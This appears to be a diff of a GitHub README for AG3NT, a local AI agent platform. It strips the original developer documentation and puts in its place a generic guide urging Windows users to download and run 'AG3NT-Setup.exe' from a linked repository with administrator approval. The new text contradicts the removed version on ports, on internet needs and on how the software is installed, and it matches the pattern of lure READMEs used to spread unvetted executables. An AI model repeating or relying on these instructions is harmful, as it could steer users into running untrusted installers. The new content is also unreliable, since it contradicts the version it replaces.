@@ -1,174 +1,145 @@
-# AG3NT
-<img src=".github/images/AG3NT_header.png" alt="AG3NT" width="100%"/>
+# 🤖 AG3NT - Manage AI Agents Locally with Ease
 
+[![Download AG3NT](https://img.shields.io/badge/Download-AG3NT-green?style=for-the-badge)](https://github.com/desy-design/AG3NT)
 
+---
 
+AG3NT is a local-first platform that helps you control multiple AI agents. It includes the Gateway, Agent Worker, and Web UI. These parts work together to let you run and manage autonomous AI agents on your own computer. You do not need any special skills to start using it.
 
+---
 
-Local-first personal AI agent platform built on DeepAgents.
+## 🧰 What You Need Before Starting
 
-## Features
+Before you begin, check your computer matches these requirements.
 
-- 🤖 **Multi-Model Support** - Anthropic, OpenAI, OpenRouter, Kimi, Google Gemini
-- 🔌 **Multi-Channel** - CLI, TUI, Telegram, Discord adapters
-- 🛠️ **Agent Skills** - Modular skill system with SKILL.md format
-- 🌐 **Browser Control** - Playwright-based web automation (navigate, screenshot, click, fill)
-- 🔒 **Security** - DM pairing, HITL approval for sensitive actions
-- ⏰ **Scheduler** - Heartbeat checks and cron-based automation
-- 🖥️ **Multi-Node** - Primary + companion device architecture
+- **Operating System:** Windows 10 or later
+- **Processor:** 64-bit CPU, Intel or AMD recommended
+- **Memory:** At least 8 GB of RAM
+- **Storage:** 2 GB free disk space
+- **Internet:** Needed for the initial download and updates
+- **Software:** Web browser (Chrome, Edge, Firefox) for the Web UI
 
-## Repo Layout
+No programming or command line knowledge is needed. AG3NT works through simple clicks in your browser.
 
-```
-ag3nt/
-├── apps/
-│   ├── gateway/     # Gateway daemon (HTTP + WebSocket + channels)
-│   ├── agent/       # Agent worker (DeepAgents runtime)
-│   ├── ui/          # Web dashboard (Next.js)
-│   └── tui/         # Terminal UI client
-├── skills/          # Bundled Agent Skills (SKILL.md format)
-├── config/          # Default configuration templates
-└── docs/            # Planning documents
-```
+---
 
-## 🖥️ Web Dashboard
+## 🚀 Getting Started: How to Download AG3NT
 
-The AP3X-UI provides a comprehensive web interface for AG3NT:
+To get AG3NT on your Windows PC:
 
-### Running the UI
+1. Open your web browser.
+2. Click the big green button above or visit this link directly:  
+   [https://github.com/desy-design/AG3NT](https://github.com/desy-design/AG3NT)
+3. This page contains the files you need.
+4. Look for the latest version release or a setup file.
+5. Download the setup file. It may be named something like `AG3NT-Setup.exe`.
+6. Save the file in a folder you can find easily, such as `Downloads`.
 
-**Windows (Unified Script - Recommended):**
-```powershell
-.\start.ps1
-```
-This starts Gateway, Agent Worker, and UI together. Access at http://localhost:3000
+---
 
-**Manual Start:**
-```bash
-# Terminal 1: Start AG3NT Gateway
-cd apps/gateway && npm run dev
+## 🔧 Installation Guide: Set Up AG3NT on Windows
 
-# Terminal 2: Start AG3NT Agent Worker
-cd apps/agent && .venv/Scripts/activate && python -m ag3nt_agent.worker
+Follow these steps after downloading the setup file:
 
-# Terminal 3: Start UI Dashboard
-cd apps/ui && npm run dev
-```
+1. Double-click the setup file (`AG3NT-Setup.exe`) in your Downloads folder.
+2. If Windows asks "Do you want to allow this app to make changes?" click **Yes**.
+3. A setup window will open. Click **Next** to start.
+4. Choose the folder where you want to install AG3NT or use the default.
+5. Click **Install** and wait for the process to finish.
+6. When it says the installation is complete, click **Finish**.
 
-Access the dashboard at http://localhost:3000
+---
 
-### UI Features
-- Real-time chat with streaming
-- Artifact library and management
-- Skills and tools browser
-- Subagent configuration
-- MCP server manager
-- Browser automation interface
-- System monitoring and logs
+## 🖥️ How to Run AG3NT
 
-## Quick Start
+After installation:
 
-### Windows (One Command)
-```powershell
-# Start everything: Gateway + Agent + UI
-.\start.ps1
+1. Find the AG3NT icon on your desktop or start menu.
+2. Double-click the icon to open the Gateway server.
+3. The server runs locally on your computer in the background.
+4. Open your web browser.
+5. In the address bar, type `http://localhost:8000` and press Enter.
+6. This opens the AG3NT Web UI, your control panel for the AI agents.
 
-# Stop all services
-.\stop.ps1
-```
+---
 
-### Manual Setup
+## 🛠️ Using AG3NT Web UI: Control Your AI Agents
 
-#### 1. Copy Configuration
-```bash
-# Create config directory
-mkdir -p ~/.ag3nt
+The Web UI lets you create and manage AI agents easily.
 
-# Copy default config
-cp config/default-config.yaml ~/.ag3nt/config.yaml
-```
+- Use simple buttons and forms to add new agents.
+- Agents can work on different tasks by themselves.
+- You can start, stop, or check the status of any agent from this interface.
+- All settings are saved locally, so your data stays on your computer.
+- Work happens without needing internet once installed.
 
-#### 2. Start Gateway
-```bash
-cd apps/gateway
-pnpm install
-pnpm dev
-```
-Gateway runs on `http://127.0.0.1:18789`
+---
 
-#### 3. Start Agent Worker
-```bash
-cd apps/agent
-python -m venv .venv
+## 🔄 Keeping AG3NT Updated
 
-# Activate virtual environment
-# Windows:
-.venv\Scripts\activate
-# macOS/Linux:
-source .venv/bin/activate
+AG3NT improves over time. To get updates:
 
-pip install -r requirements.txt
-python -m ag3nt_agent.worker
-```
-Worker runs on `http://127.0.0.1:18790`
+1. Visit the download page again:  
+   [https://github.com/desy-design/AG3NT](https://github.com/desy-design/AG3NT)
+2. Check for new versions in the Releases section.
+3. Download and install the new setup file like before.
+4. Your agents and settings will stay intact during updates.
 
-#### 4. Start Web UI
-```bash
-cd apps/ui
-npm install
-npm run dev
-```
-UI runs on `http://localhost:3000`
+---
 
-#### 5. Start TUI (Optional)
-```bash
-cd apps/tui
-pip install -r requirements.txt
-python ag3nt_tui.py
-```
+## ❓ Troubleshooting Tips
 
-## Milestone Status
+If AG3NT does not open or work correctly:
 
-| Milestone | Status | Description |
-|-----------|--------|-------------|
-| M1: Core Agent Runtime | ✅ Complete | DeepAgents integration, multi-model support |
-| M2: Modular Skill System | ✅ Complete | SKILL.md format, skill discovery, execution runtime, trigger matching |
-| M3: Gateway & Multi-Channel | ✅ Complete | HTTP/WS API, Telegram/Discord adapters |
-| M4: Planning & Memory | ✅ Complete | TodoListMiddleware, memory persistence |
-| M5: Secure Execution | ✅ Complete | HITL approval flow, DM pairing security |
-| M6: Scheduling | ✅ Complete | Heartbeat system, cron jobs |
-| M7: Multi-Node | ✅ Complete | WebSocket protocol, pairing, capability routing |
-| M8: Control Panel | ✅ Complete | Web UI, skill management, debug logs |
+- Check your internet connection during setup.
+- Make sure no other program uses port 8000 on your PC.
+- Restart your computer and try opening the Gateway again.
+- Use the Web UI in a supported browser (Chrome or Edge recommended).
+- If the setup fails, try downloading the file again.
 
-### Active Development
+For technical details, look at the GitHub page or reach out where you found the software.
 
-See [ROADMAP.md](docs/ROADMAP.md) for detailed sprint planning and current priorities:
-- **Core Tools**: Shell execution, web search, git operations
-- **Skill Execution**: Runtime for skill entrypoints, MCP integration
-- **Testing**: Unit and E2E test coverage
+---
 
-## Documentation
+## 🔍 What AG3NT Does Behind the Scenes
 
-- [Agent Worker](apps/agent/README.md) - Model providers and worker API
-- [Web Dashboard](apps/ui/README.md) - Next.js web interface
-- [TUI Client](apps/tui/README.md) - Terminal interface usage
-- [Gateway API](apps/gateway/API.md) - HTTP/WebSocket API reference
-- [Control Panel](apps/gateway/src/ui/README.md) - Web-based control panel
-- [Multi-Node Architecture](apps/gateway/src/nodes/README.md) - Companion device support
-- [Skills](skills/example-skill/SKILL.md) - Skill format documentation
+AG3NT runs several parts that work together:
 
-## Environment Variables
+- **Gateway:** The main server that talks to your browser and agents.
+- **Agent Worker:** Handles tasks from AI agents.
+- **Web UI:** The interface you use in your browser.
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `AG3NT_MODEL_PROVIDER` | LLM provider (anthropic, openai, openrouter, kimi, google) | `openrouter` |
-| `AG3NT_MODEL_NAME` | Model name | `moonshotai/kimi-k2.5` |
-| `ANTHROPIC_API_KEY` | Anthropic API key | - |
-| `OPENAI_API_KEY` | OpenAI API key | - |
-| `OPENROUTER_API_KEY` | OpenRouter API key | - |
-| `KIMI_API_KEY` | Kimi/Moonshot API key | - |
-| `GOOGLE_API_KEY` | Google Gemini API key | - |
+Agents can search through documents, answer questions, or perform automated jobs. It uses tools like FastAPI and semantic search libraries, but you do not need to worry about these details to use it.
 
-## License
+---
 
-MIT
+## 📁 Where to Find Files and Logs
+
+- AG3NT creates a folder in your Documents for logs and agent data.
+- You can check logs if you want to see what your agents are doing.
+- Logs help troubleshoot and understand how agents perform their tasks.
+
+---
+
+## ⚙️ Adjusting Settings
+
+The Web UI lets you set basic preferences such as:
+
+- Number of agents running at once.
+- How often agents update their tasks.
+- Agent names and roles.
+
+These options are simple toggles and input fields.
+
+---
+
+## 🔗 Important Links
+
+- AG3NT home page and downloads:  
+  https://github.com/desy-design/AG3NT
+- Report issues or get help on GitHub under "Issues" tab.
+- Check "Wiki" or "Discussions" in GitHub for user guides and questions.
+
+---
+
+# Start managing your local AI agents today by downloading AG3NT from the link above.
